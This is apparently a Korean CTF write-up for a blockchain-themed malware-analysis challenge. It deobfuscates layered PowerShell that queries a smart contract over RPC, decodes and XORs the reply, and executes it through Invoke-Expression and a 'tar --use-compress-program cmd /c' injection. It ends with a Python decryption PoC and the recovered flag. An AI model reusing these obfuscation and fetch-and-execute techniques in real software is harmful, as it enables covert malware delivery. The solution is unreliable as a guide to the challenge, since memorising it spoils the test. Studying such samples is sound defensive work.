+','laV- xednIdne KoY+KoYema','F sOI )1 ','oY::]gnidocnE.tx','eSKoY( G62,KoY.KoY ,KoYriGHTToLeftKoY) DF9%{X2j_ } )+G62 X2j(set-ITEM  KoYvArIAbLE:oFSKoY KoY KoY )G62) ',' setyBxeh em','etirW#
+ )1aP 1aP KoY+KoYnioj- setyBxehK6f( eulaV- gnirtSxehKoY+KoY emaN- elbairaKoY+KoY','T::]trevnoC[    
+)1 + xednItra','alper- pserK6','rtSteG.8FTU::]gnidocnE.txeT.metsyS[( eulaV- 1set','elbairaV-tKoY+KoYeS
+)sretcarahc xeh fo sriap gnir','. ( X2jEnV:coMspec[4,26,25]-jOInKoYKoY)(G62X2j(set-iTem KoYVAriABle:OfSKoY  KoYKoY )G62 + ( [STrinG][REGEx]:','N- elbairaV-teS
+sety','aN- elbairaV-teS    
+{ tcejbO-hcaEro','- 2setyb emaN- eKoY+KoYlbairaV-teS
+))',' eht mrofreP ','ne emaN- elbairKoY+KoYaV-teS    
+)2 * _K6f( eulaV- ','-]2,11,3[EmAN.)KoY*rdm*KoY ElBAIrav((.DF9)421]RAHc[]GnIRTS[,KoYsOIKoY(EcALPER.)','ppaIz7 epyTtnet','csAtlKoY+KoYuserK6f( euKoY+KoYlaV- setyBxeh emaN- elbairaV-teS
+))46es','owt sa etyb hcae ',' - 2 / htgneL.rebmuNxehK6f(..0( eulaV- 0setyb emaN- elbairaV-teS
+)sretcarahc xeh fo sriap gnirusne(K',' elbairaV-','b ot 46esab morf trevnoC #
+
+))881 ,46(gnirtsbuS.1setybK6f( e','raV-teS
+ )}
+)61 ,)2 ,xednItratsK6f(gnirtsbuS','N- elbairaV-teS    
+)2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS    
+{','aN-','oY+KoY setyb ot xeh morf trevnoC #
+)1aP1',' a ot kc','YNIoJ','aN- elbairaV-t','cALPER.)KoYaVIKoY,)09]RAHc[+601]RAHc[+78]RAH','#
+))Iz742NOERALFIz7(setyBteG.IICSA::]gnidocnE.txeT[( eulaV- setyByek emaN- elbairaV-teKoY+KoYS
+setyb ot yek eht trevnoC #
+))3setybK6f(gnirtSteG.8FTU::]gnidocnE.tx','V-t','aP ,1aPx01aP ec',' elbairaV-teS
+gnirtSxKoY+KoYehK6f tuKoY+KoYptuO-',':MATCHeS(G62)KoYKo','ohtemIz7{1aP( eulaV- ydob_ emaN- elbairaV-teS
+)Iz7 Iz7( eulaV-KoY+KoY tniKoY+KoYopdne_tentset em','c1aP maKoY+KoYrgorp-sserpmoc-esu-- x- ratIzKoY+KoY7( eulaV-KoY+KoY dnammoc emaKoY+KoYN- elbairaV-teS
+
+))setyBtluserK6f(gnirtSteGKoY+KoY.II','- 2 / htgneL.setyBxehK6f(..0( eulaV- 3setyb emaN- ','tsK6f( eulaV- xednId','setyBtluser emaN- ','43]RAHc[]GnIRTS[,)37]RAHc[+221]RAHc[+55]RAHc[((E','elbairaVKoY+KoY-teS    
+{ )++iK6f ;htgneL.5setybK6f tl- iK6f ;)0( eulaV- i emaN- elbairaV-teS( rof
+))(@( eulaV- setyBtluser emaN- KoY+KoYelbairaV-teS
+noitarepo ROX')).REpLACE('DF9','|').REpLACE('KoY',[STrinG][cHaR]39).REpLACE(([cHaR]71+[cHaR]54+[cHaR]50),[STrinG][cHaR]34).REpLACE('X2j','$').REpLACE('aVI',[STrinG][cHaR]92) | &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')
+```
+
+<br />
+
+~~이쯤에서 문제가 조금 더럽다는 인상을 받았다.~~ `$EnV:coMspec`은 `cmd.exe`의 기본 경로를 나타내고, 보통 `C:\Windows\System32\cmd.exe`일테니 `( $EnV:coMspec[4,26,25]-jOIn'')` 또한 `iex`이다. 이번엔 `iex | ~~~~~`의 형태가 되었으므로, 뒷 `~~~~~`를 파워쉘로 실행한다.
+
+```js
+. ( $EnV:coMspec[4,26,25]-jOIn'')("$(set-iTem 'VAriABle:OfS'  '' )" + ( [STrinG][REGEx]::MATCHeS(")''NIoJ-]2,11,3[EmAN.)'*rdm*' ElBAIrav((.|)421]RAHc[]GnIRTS[,'sOI'(EcALPER.)43]RAHc[]GnIRTS[,)37]RAHc[+221]RAHc[+55]RAHc[((EcALPER.)'\',)09]RAHc[+601]RAHc[+78]RAHc[((EcALPER.)93]RAHc[]GnIRTS[,)94]RAHc[+79]RAHc[+08]RAHc[((EcALPER.)63]RAHc[]GnIRTS[,)57]RAHc[+45]RAHc[+201]RAHc[((EcALPER.)' dnammocK6f noisserpxE-ekovnI )Iz7galfZjWZjW:C f- 1aPga'+'lfZjWZjW:C > gnirtStl'+'userK6'+'f ohce c/ dmc1aP ma'+'rgorp-sserpmoc-esu-- x- ratIz'+'7( eulaV-'+' dnammoc ema'+'N- elbairaV-teS ))setyBtluserK6f(gnirtSteG'+'.IICSA'+'::]gnidocnE.txeT.metsyS[( eulaV- gnirtStluser emaN- elbairaV-teS )gnidocne IICSA gnimussa( gnirts a ot kc'+'ab tl'+'u'+'ser eht trevnoC # } ))]htgneL.setyByekK6f % iK6f[setyByekK6f roxb- ]iK6f[5setybK6f( + setyBtluserK6f( eulaV- setyBtluser emaN- elbairaV'+'-teS { )++iK6f ;htgneL.5setybK6f tl- iK6f ;)0( eulaV- i emaN- elbairaV-teS( rof ))(@( eulaV- setyBtluser emaN- '+'elbairaV-teS noitarepo ROX eht mrofreP # ))Iz742NOERALFIz7(setyBteG.IICSA::]gnidocnE.txeT[( eulaV- setyByek emaN- elbairaV-te'+'S setyb ot yek eht trevnoC # ))3setybK6f(gnirtSteG.8FTU::]gnidocnE.txeT[( eulaV- 5setyb emaN- elbairaV-teS )} )61 ,)2 ,xednItratsK6f(gnirtsbuS.setyBxehK6f(etyBoT::]trevnoC[ )1 + xednItratsK6f( eulaV- xednIdne emaN- elbair'+'aV-teS )2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS { tcejbO-hcaEroF sOI )1 - 2 / htgneL.setyBxehK6f(..0( eulaV- 3setyb emaN- elbairaV-t'+'eS )sretcarahc xeh fo sriap gnirusne( setyb ot xeh '+'morf trevnoC # )Iz7Iz7 ,Iz7 Iz7 ecalper- setyBxehK6f('+' eula'+'V- setyBxeh emaN- elbairaV-teS gnirtSx'+'ehK6f tu'+'ptuO-etirW# )1aP 1aP '+'nioj- setyBxehK6f( eulaV- gnirtSxeh'+' emaN- elbaira'+'V-teS )} srettel esacr'+'eppu htiw xeh tigid-owt sa etyb hcae tamroF #  _K6f f- 1aP}2X:0{1aP { tcejbO-hcaEroF sOI iicsAtl'+'userK6f( eu'+'laV- setyBxeh emaN- elbairaV-teS ))46esaBmorFs'+'etybK6f(gnirtSte'+'G.8FTU::]gni'+'docnE.txe'+'T.metsyS[( '+'eulaV- '+'iicsAtluser emaN-'+' elbairaV-teS ))2setybK6f(gni'+'rtS46esaBmorF::]trevnoC[( eulaV- 46esaBmorFsetyb emaN- elbairaV-teS setyb ot 46esab morf trevnoC # ))881 ,46(gnirtsbuS.1setybK6f( eulaV- 2setyb emaN- e'+'lbairaV-teS ))0setybK6f(gnirtSteG.8FTU::]gnidocnE.txeT.metsyS[( eulaV- 1setyb emaN- elbairaV-teS )} )61 ,)2 ,xednItratsK6f(gnirtsbuS.rebmuNxehK6f(etyBoT::]trevnoC[  '+' )1 + xedn'+'ItratsK6f( eulaV- xednIdne '+'emaN- elbairaV-teS )2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS { '+'t'+'cejbO-hcaEroF'+' sOI )1 - 2 / htgneL.rebmuNxehK6f(..0( eulaV- 0setyb emaN- elbairaV-teS )sretcarahc xeh fo sriap gnirusne('+' setyb ot xeh morf trevnoC # )1aP1aP ,1aPx01aP ecalper- pserK6f( eulaV- rebmuNxeh emaN- elbairaV-teS xiferp 1aPx01aP eht evomeR '+'# )tluser.)ydob_K6f ydoB- Iz7nosj/noitacilppaIz7 epyTtnetno'+'C- tniopdne_tentsetK6f irU- 1aPtsoP1aP d'+'ohteM- do'+'hteMtseR-ekovnI(( eulaV- pser emaN- elbairaV-teS )1aP}Iz70.2Iz7:Iz7cprnosjIz'+'7,1:Iz7diIz7,]KCOLB ,}Iz7bcf088c5x0Iz7:Iz7atadIz7,'+'Iz7sserddaK6fIz7:Iz7otIz7'+'{[:Iz7smarapIz7,Iz7llac_hteIz7:Iz7dohtemIz7{1aP( eulaV- ydob_ emaN- elbairaV-teS )Iz7 Iz7( eulaV-'+' tni'+'opdne_tentset emaN- elbairaV-teS'( ",'.' ,'riGHTToLeft') |%{$_ } )+" $(set-ITEM  'vArIAbLE:oFS' ' ' )")
+```
+
+<br />
+
+해독 안해봐도 `iex`다. 뒷 부분 지우고 한 번 더 실행한다.
+
+```js
+('Set-Variable -Name testnet_endpo'+'int '+'-Value (7zI 7zI) Set-Variable -Name _body -Value (Pa1{7zImethod7zI:7zIeth_call7zI,7zIparams7zI:[{'+'7zIto7zI:7zIf6Kaddress7zI'+',7zIdata7zI:7zI0x5c880fcb7zI}, BLOCK],7zIid7zI:1,7'+'zIjsonrpc7zI:7zI2.07zI}Pa1) Set-Variable -Name resp -Value ((Invoke-RestMeth'+'od -Metho'+'d Pa1PostPa1 -Uri f6Ktestnet_endpoint -C'+'ontentType 7zIapplication/json7zI -Body f6K_body).result) #'+' Remove the Pa10xPa1 prefix Set-Variable -Name hexNumber -Value (f6Kresp -replace Pa10xPa1, Pa1Pa1) # Convert from hex to bytes '+'(ensuring pairs of hex characters) Set-Variable -Name bytes0 -Value (0..(f6KhexNumber.Length / 2 - 1) IOs '+'ForEach-Objec'+'t'+' { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Variable -Name'+' endIndex -Value (f6KstartI'+'ndex + 1) '+'  [Convert]::ToByte(f6KhexNumber.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString(f6Kbytes0)) Set-Variabl'+'e -Name bytes2 -Value (f6Kbytes1.Substring(64, 188)) # Convert from base64 to bytes Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64Str'+'ing(f6Kbytes2)) Set-Variable '+'-Name resultAscii'+' -Value'+' ([System.T'+'ext.Encod'+'ing]::UTF8.G'+'etString(f6Kbyte'+'sFromBase64)) Set-Variable -Name hexBytes -Val'+'ue (f6Kresu'+'ltAscii IOs ForEach-Object { Pa1{0:X2}Pa1 -f f6K_  # Format each byte as two-digit hex with uppe'+'rcase letters }) Set-V'+'ariable -Name '+'hexString -Value (f6KhexBytes -join'+' Pa1 Pa1) #Write-Outp'+'ut f6Khe'+'xString Set-Variable -Name hexBytes -V'+'alue '+'(f6KhexBytes -replace 7zI 7zI, 7zI7zI) # Convert from'+' hex to bytes (ensuring pairs of hex characters) Se'+'t-Variable -Name bytes3 -Value (0..(f6KhexBytes.Length / 2 - 1) IOs ForEach-Object { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Va'+'riable -Name endIndex -Value (f6KstartIndex + 1) [Convert]::ToByte(f6KhexBytes.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString(f6Kbytes3)) # Convert the key to bytes S'+'et-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes(7zIFLAREON247zI)) # Perform the XOR operation Set-Variable'+' -Name resultBytes -Value (@()) for (Set-Variable -Name i -Value (0); f6Ki -lt f6Kbytes5.Length; f6Ki++) { Set-'+'Variable -Name resultBytes -Value (f6KresultBytes + (f6Kbytes5[f6Ki] -bxor f6KkeyBytes[f6Ki % f6KkeyBytes.Length])) } # Convert the res'+'u'+'lt ba'+'ck to a string (assuming ASCII encoding) Set-Variable -Name resultString -Value ([System.Text.Encoding]::'+'ASCII.'+'GetString(f6KresultBytes)) Set-Variable -N'+'ame command '+'-Value (7'+'zItar -x --use-compress-progr'+'am Pa1cmd /c echo f'+'6Kresu'+'ltString > C:WjZWjZfl'+'agPa1 -f C:WjZWjZflag7zI) Invoke-Expression f6Kcommand ').REPLAcE(([cHAR]102+[cHAR]54+[cHAR]75),[STRInG][cHAR]36).REPLAcE(([cHAR]80+[cHAR]97+[cHAR]49),[STRInG][cHAR]39).REPLAcE(([cHAR]87+[cHAR]106+[cHAR]90),'\').REPLAcE(([cHAR]55+[cHAR]122+[cHAR]73),[STRInG][cHAR]34).REPLAcE('IOs',[STRInG][cHAR]124)|.((varIABlE '*mdr*').NAmE[3,11,2]-JoIN'')
+```
+
+<br />
+
+드디어 모든 난독화 해제가 완료되었다. Method `0x5c880fcb`를 호출 후 받은 응답에서 `0x`를 제거하고 편집, base64 디코딩 및 XOR 연산 등을 하는 내용 등을 포함하고 있다.
+
+```js
+Set-Variable -Name testnet_endpoint -Value (" ") 
+Set-Variable -Name _body -Value ('{"method":"eth_call","params":[{"to":"$address","data":"0x5c880fcb"}, BLOCK],"id":1,"jsonrpc":"2.0"}') 
+Set-Variable -Name resp -Value ((Invoke-RestMethod -Method 'Post' -Uri $testnet_endpoint -ContentType "application/json" -Body $_body).result)
+# Remove the '0x' prefix Set-Variable -Name hexNumber -Value ($resp -replace '0x', '') # Convert from hex to bytes (ensuring pairs of hex characters)
+Set-Variable -Name bytes0 -Value (
+  0..($hexNumber.Length / 2 - 1) | ForEach-Object { 
+    Set-Variable -Name startIndex -Value ($_ * 2) 
+    Set-Variable -Name endIndex -Value ($startIndex + 1)   
+    [Convert]::ToByte($hexNumber.Substring($startIndex, 2), 16) 
+    }
+  ) 
+Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString($bytes0)) 
+Set-Variable -Name bytes2 -Value ($bytes1.Substring(64, 188)) 
+# Convert from base64 to bytes 
+Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64String($bytes2)) 
+Set-Variable -Name resultAscii -Value ([System.Text.Encoding]::UTF8.GetString($bytesFromBase64)) 
+Set-Variable -Name hexBytes -Value ($resultAscii | ForEach-Object {
+   '{0:X2}' -f $_  # Format each byte as two-digit hex with uppercase letters 
+  }) 
+Set-Variable -Name hexString -Value ($hexBytes -join ' ') 
+#Write-Output $hexString Set-Variable -Name hexBytes -Value ($hexBytes -replace " ", "") 
+# Convert from hex to bytes (ensuring pairs of hex characters) 
+Set-Variable -Name bytes3 -Value (
+  0..($hexBytes.Length / 2 - 1) | ForEach-Object { 
+    Set-Variable -Name startIndex -Value ($_ * 2) 
+    Set-Variable -Name endIndex -Value ($startIndex + 1) 
+    [Convert]::ToByte($hexBytes.Substring($startIndex, 2), 16) 
+  }
+) 
+Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString($bytes3)) 
+# Convert the key to bytes 
+Set-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes("FLAREON24")) 
+# Perform the XOR operation 
+Set-Variable -Name resultBytes -Value (@()) for (Set-Variable -Name i -Value (0); $i -lt $bytes5.Length; $i++) {
+  Set-Variable -Name resultBytes -Value ($resultBytes + ($bytes5[$i] -bxor $keyBytes[$i % $keyBytes.Length])) } 
+# Convert the result back to a string (assuming ASCII encoding) 
+Set-Variable -Name resultString -Value ([System.Text.Encoding]::ASCII.GetString($resultBytes))
+Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $resultString > C:\\flag' -f C:\\flag") Invoke-Expression $command
+```
+
+<br />
+
+## PoC
+
+위 파워쉘 코드를 재현하는 PoC코드를 작성하면 된다. 메소드에 대한 input 값은 앞서 다루었듯 BSCScan에서 가져온다. 어느 block이 flag에 관한 것인지 알 수 없으므로 전수조사를 실시한다. 만약 이것만으로 flag가 출력되지 않는다면 이 스마트 컨트랙트 또한 디컴파일하여 로직을 살펴볼 필요가 있다.
+
+```python
+import base64
+
+def extract_ascii(split):
+    ascii_chars = [chr(b) for b in split if 0x20 <= b <= 0x7E]
+    return ''.join(ascii_chars)
+    
+def decrypt(cyphertexts):
+    key=b'FLAREON24'
+    for cipher in ciphertexts:
+        try:
+            byte_string = cipher.to_bytes((cipher.bit_length() + 7) // 8, 'big')
+            byte_strings = byte_string.split(b'\x00')
+            for split in byte_strings:
+                if len(split) > 10:
+                    b_encoded = extract_ascii(split)
+                    break
+            b_decoded = base64.b64decode(b_encoded)
+            data_bytes = bytes.fromhex(b_decoded.decode().replace(" ", ""))
+            xor_result = bytes([data_bytes[i] ^ key[i % len(key)] for i in range(len(data_bytes))])
+            print(xor_result)
+        except:
+            continue
+        
+if __name__=='__main__':
+    ciphertexts = [
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000bc4e4445674d3245674e3245674e3249674d324d674e324d674d3251674e4745674e5441674e4755674e5755674e7a59674e4451674e5455674e6a63674d5445674e5441674e5755674e6a59674d5455674d3245674e5455674d3259674d5463674d324d674d3251674e5445674d5455674e6a45674e5455674e546b674e4445674e6d51674d7a6b674e4755674e4449674e6a4d674e6d49674e324d674e4445674d6a49674e6a55674e6a41674d4745674e6d4d674e6a55674e6a4d3d00000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000bd4d4467674e324d674d7a55674d4751674e7a59674d7a6b674e3251674e574d674e6d49674d4449674d574d674d544d674d546b674d5745674d6a59674e3249674e6d51674e6a41674d6d55674e3251674e7a51674d4751674e7a51674e324d674e3251674d4455674e6d49674e7a63674d6a49674d5755674d4455674d6a41674d6d51674e3251674e7a49674e5449674d6d45674d6d51674d7a4d674d7a63674e6a67674d6a41674d6a41674d574d674e5463674d6a6b674d6a453d3d000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000614d4759674e6d4d674d7a59674d3249674d7a59674d6a63674e6d55674e4459674e574d674d6d59674d3259674e6a45674d6a55674d6a51674d324d674e6d55674e4459674e574d674d6a4d674e6d4d674d6a63674d3255674d6a51674d6a673d3d00000000000000000000000000000000000000000000000000000000000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000404d5759674d6a6b674d7a55674e7a49674d6a67674d6a41674d324d674e5463674d5451674d6a67674d6a4d674d6a67674d6a45674d6a41674e6d55674e6d593d,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000844d4445674d6a4d674d6d55674d7a59674e6a55674d3249674d6a59674e5749674e5745674d6a45674e6d4d674d7a55674d3245674d6d4d674d324d674e6d55674e5749674e4463674e6a59674d6a4d674d6d59674e7a49674d7a45674d6a63674d6d49674d5449674e4441674d6a4d674d3259674d7a55674d324d674d6a41674d32493d00000000000000000000000000000000000000000000000000000000,
+        0x916ed24b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000133457334e5a63335246625335555a5868304c6d564f513039456157354858546f36645735705932396b5253356e5a58525464484a70626b636f57334e5a633352466253356a5430353252584a3058546f36526e4a7654574a68553055324e484e30556b6c755279676953586443553046485255466a643049775155644651557852516e5242527a68425a464643656b46485655466a6430466e5155564651574a52516e70425232744254464643564546485455465a55554a3151554d775156466e516a464252316c42576d6443624546495355464a51554a335155644651575242516d70425232644253554643593046484e4546455555464c51554e525156706e516d394252316c425a564643616b4644515546515555466e5155564251556c6e51553542515739425a464643656b4648613046695a304a7551554e4251565633516a5642534531425a454643624546484d4546506430464f5155467651575252516e704252327442596d6443626b464451554656643049315155684e51575242516d7842527a42425447644355304649565546695a3049775155647251574a52516d7842517a524255314643645546495555466155554a355155633451574e42516c524252315642593264434d6b46486130465a64304a735155684e515539335155354251573942593046434d5546485355466951554a775155644e51556c42516d70425233644257564643656b46495455464a51554a745155646e5156706e516a564252303142535546434e3046424d4546445a30466e51554e4251556c4251576442526e4e42556b4643633046486430465455554a305155684251574a33516e6c425346464253304642615546486330466155554a355155633051567052516e4e42524531425457644261554644613046595555464f5155467651556c42515764425130464253554643643046495655465a5a304a7a5155647251566c3351576442534531425a454643614546495555466855554a7151554e4251567052516a524253464642576c4643655546484e45464a51554a4b5155633051575242516c464253464642593264425a304646593046615555497751555a4251574e6e516e5a425230314255564643613046485555466a5a304a735155684e51574e335157394252577442596d64434d4546475155466b51554a3551554e4251574642516b3542527a6842576b46434d554648643046615555467a51554e4251574e33516a424253456c4259564643645546485930464a51554a335155684a51574a33516d70425254524257564643644546485655464c555545335155457751554e6e5157644251304642535546425a3046476330465351554a7a5155643351564e52516e524253454642596e6443655546495555464c515546705155647a51567052516e6c42527a5242576c4643633046455455464e5a30467051554e72515668525155354251573942535546425a3046445155464a51554a335155685651566c6e516e4e4252327442575864425a3046495455466b51554a6f5155685251574652516d704251304642576c46434e4546495555466155554a355155633051556c42516b7042527a52425a454643555546495555466a5a30466e5155563351574a33516d68425231464256454643634546485355466a5a304a6f5155684a5157565251573942534531425a45464365554648613046695a304a7551554e4251574a6e516d6842527a4242576c464263454645633046455555464c51554e4251556c42515764425130464256336443525546486430466951554a4b5155637751574e42516e5a4253456c425a454642623046445355466864304a735155684a51574a6e516d78425233644254586442655546445355464c55554a6b5155457751554e6e5157644251304642535546425a3046495155466b55554a705155643351574652516d704251304642593364434d4546485255466b51554a775155644e51556c42516d7842534764425a45464362454649535546695a30466e5155644a51574a33516e5a425233644253554643563046486130466a5a3049775155685651566c52516e4e42526b464259326443646b46495555466155554a715155685251557442516b7042527a52425a454643555546495555466a5a30466e5155643351574e42516b4a4252314642576b4643655546485655466a64304a3651554e3351556c42516c5a4252577442596d64434d4546475155466b51554a3551554e4251574652516a52425230564259576443644546496230464d5155466e5155685651574652516e5642534646425355464362554648643046555a304a735155686a51565642516e6c42527a68425a454643624546485455466b5155467a51554e4251574a33516a464253464642535546434d554648613046695a30497751554e4251574a42516e644252316c42596b4643554546486430466151554a525155684a51574a33516a424252315642575864434d454644613046506430464f5155467651575a52515535425157394253576443515546424d4546445a30464f5155467651564652516d74425231464254464643565546496130466a51554a7351554e4251557042516d314252326442576d64434e554648545546455555464c5155457751554e6e51577442527a52425a5764434d30464955554661643049795155645251556c4251546c425130464256336443625546485a3046615a3049315155644e5156685251545a425247394256454643646b46485255466151554a4e5155647251566c6e516e6c4252305642593264434e5546445a30464a5a30467251554e6e515574425157354254303142596c4643656b46504d45464d5a30467551554e7a51557033516d744252336442596b4642626b46446130464d5a304a505155553451574e6e516e524252555642596b464363454649623046535555467651555a7a51566c33516b6c4252305642565764435a4546445a30464f6430463351554e765155313351586842517a684254586442654546446130464c64304a695155644e51574642516d684253456c4257464642623046455255464e5555463451554e7251557433516d4a42525531425955464361454649535546595555467651555a7a5156466e516a564253464642576c46435a4546455155466c5155457a5155524a5155745251584a42526e4e425558644353554648525546565a304a6b51554e6e515531525158644252477442533364424d6b46455155464d55554579515552425155745251584a42526e4e425558644362304648525546565a304a6b51554e6e515535525154424251334e42545646424d4546446130464c5555466e51554d7751574e6e516d784253454642596b464361454648545546615555466e51555a7a51566c33516d394252305642565764435a4546445a30465864304a7051555a7251565a42516b5a42526a4242545546434e4546455655465a6430467751554e7a51566433516b52425257644257564643655546474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f6430463351554e7251557433516d4a425255314259554643516b46475355465955554676515552465155316e5158704251334e4254576442644546455355464c5555467951555a7a51564633516b6c4252305642593264435a4546445a30465864304a705155687251575242516d7842526a4242545546434e454645555546615155467751554e7a51566433516b52425232644255564643553046474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f5a304a7351554e7251557433516d4a42523031425955464361454649535546595555467651555a7a51566c6e516a5642526c4642556c46435a4546455155466c5155457a51556452515574525158424251306c4253314642546b46426230464b51554a315155647651575652516a4e4252324e42596e64425a3046454d45464a51554a695155645a51574642516d314253477442575864435a454645623046505a304a495155645651575242516c464253456c42596e6443616b46465255466151554a725155684a51567052516e70425345314253304642613046484e45466c5a30497a5155685251567033516a4a4252314642544546425a3046445355464b5155467651554e6e5155703352454a42527a424259336445633046475455465a6430467551554e7a5155703352477442527a5242555764434d554648575546615a30467551554e7a51557033516d784253456c42536e6442634546444e4546555a304a515155684a51574a52516b4a4252586442553146434e6b46465655464c51554a695155564e51564e42516d6842526b6c4257464642623046476330465a5a304a6151555a5251564a52516d5242524546425a5546424d4546455755464c5555467951555a7a51564633516d394252305642593264435a4546445a30465864304a7051555a7251565a42516d7842526a4242545546434e454645575546615a30467751554e7a51566433516d70425257644255564643655546474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f6430463551554e7251557433516d4a4252553142553046436145464953554659555546765155524651553142515456425132744253336443596b46485455465451554a6f51555a4a5156685251573942526e4e42555764434e5546475555466155554a6b5155524251575642515442425246464253314642634546445155464d55554a355155645651574e42516e4e425230564257586443624546445155465864304a715155646e51564652516c4e42526a4242533046424e5546455355464c5555467951555a7a51564633516d394252305642593264435a4546445a30465864304a705155687251565a42516b5a42526a4242545546434e4546455930464e5155467751554e7a51566433516d70425232644257564643553046474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f64304a7051554e7251557433516d4a42523031425955464361454647535546595555467651555a7a5156466e516c704253464642556c46435a4546455155466c51554577515564525155745251584a42526e4e4257586443623046485255466a5a304a6b51554e6e5155316e5158684251334e42543046424e5546446130464c64304a695155644e51574642516d6842526b6c4257464642623046455455464e555546795155527251553542515842425132744253576442634546424d4546445a3046725155684251556c4251546c425130464254554642546b46426230465864304a745155646e5156706e516a564252303142574646424e6b4645623046575a304a775155684a51575242516a464252305642596b46435555464953554669643049775155645651566c33516a424251326442536b4643645546486230466c5555497a5155646a51574a3351584e4251304642563364434d554648613046695a3049775155524e5155316e516d524252465642544546425a3046455155466c51554577515552425155784251576442526e4e425932644362454648575546595555467251556842515574525155354251573942536b464362304648525546695155493151554e42515642525157644251306c42545546434e45464653554650515546705155457751554e6e5157744252314642576b4643645546485930464a5155453551554e4251556c6e5158644253476442546c46424d304644535546455555464c51554e5251575642516d744252315642593146425a3046454d45464a515546705155524251575642515864425245464253576442546b46426230464b51554a305155644a51574e6e516d314251304642554646425a3046445355464e51554930515552425155353351576c425154424251326442613046485655466b64304a6f5155684651556c4251546c425130464253576442643046495a3046505155463351554e4a515552525155744251314642576d6443654546496230466b5155466e5155517751556c4251576c42524546425a554643524546455455464a5a30464f5155467651557042516a564252316c42596d6443635546485355464a5155453551554e4251566433516b4e42534774425a454643624546476330465955554a6b51554e4251557442515774425232644257564643633046496130464d515546725155645251567042516e564252324e4254454642613046495a30466151554a73515568465155784251577442527a424257576443655546485755464d5155467951554e5251567052516a4e425230564259314642633046446330464b51554a74515568465157566e516a424251327442524646425330464763304656643049315155684e51575242516d7842527a42425447644355304649565546695a3049775155647251574a52516d7842517a524255314643645546495555466155554a355155633451574e42516c524252315642593264434d6b46486130465a64304a735155684e5155786e516b35425230564259326443656b46485a30465a55554a7a515559775155396e51545a4252553142596e6443643046496130464c51554672515568725156706e516e56425232394257576442633046445155464e5155467a51554e4251557042516e5642523239425a5646434d304648593046696430467a51554e425155356e515842425154303949696b7066476c6c65413d3d000000000000000000000000,
+        0x916ed24b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008a4d2b324d3864646e666d733151686b3455783433564756726f6d38775562544d70475a7332444438536c485a3558345a37436273665a586d6144456f352b536e4c6f2f694c615168702b72652b2b5a6158645148683858796d593653733043326e71324b50646a2f3357656d3838714e5442577438596a7342764442426a45595a492b586c513d3d3d3d00000000000000000000000000000000000000000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000c84667585230317141345547506376484d7670317935553734454a73396756696e345051356c3648614c2b7953786b327030572b64364a694c784e444a7071686c76734f632b714655435338586d776b764135462b49697745515a5759496672334e754639322f5458586d6b5749416c73496d6c55466155373834336570564e64746134696d472b49746d47394b386d394e6269506264634861564769614668504d715772576d4168753850686a6f6958585335396b46616e7750794465755879392b4a4566416a61000000000000000000000000000000000000000000000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a864502f476c6b456e656a705a6f3032394f624d75346c5a306a646650314147415a4572324b676f3143672b75684b677a7061477974446741517855386a58762f31616441747054685368587534775970534e54446f344464776b46794633513434582f4b336c6f634568494249443551664f584566786478703458456a784748624d4c71504572506e526d616d546d6d43555446614958507768563378413039775156333443553d000000000000000000000000000000000000000000000000,
+        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a864502f476c6b456e656a705a6f3032394f624d75346c5a306a646650314147415a4572324b676f3143672b75684b677a7061477974446741517855386a58762f31616441747054685368587534775970534e54446f344464776b46794633513434582f4b336c6f634568494249443551664f584566786478703458456a784748624d4c71504572506e526d616d546d6d43555446614958507768563378413039775156333443553d000000000000000000000000000000000000000000000000,
+        0x916ed24b00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000078635253494a59654e5f6f66526972743668667636424b3548357649656e494b614969734a5275704d66366678676c4b4b4931384a4e50444742536b766f414c626866666245506848574346615a67424942477347496d6d70714f704c4c6b6c5643475554326f764346384d6b5279463172665233767046380000000000000000,
+    ]
+    decrypt(ciphertexts)
+```
+
+<br />
+
+flag가 잘 출력되었다. 
+
+`b'\x07v;)y3sxd\x08\x127\x16\x10(_bj Y{\x07zXr\x0feS-\x14\x0b\x04"w|v%\'=\x13g*.8X#/'`
+`b'N0t_3v3n_DPRK_i5_Th15_1337_1n_Web3@flare-on.com'`
+`b'Yet more noise!!'`
+`b'Good thing this is on the testnet'`
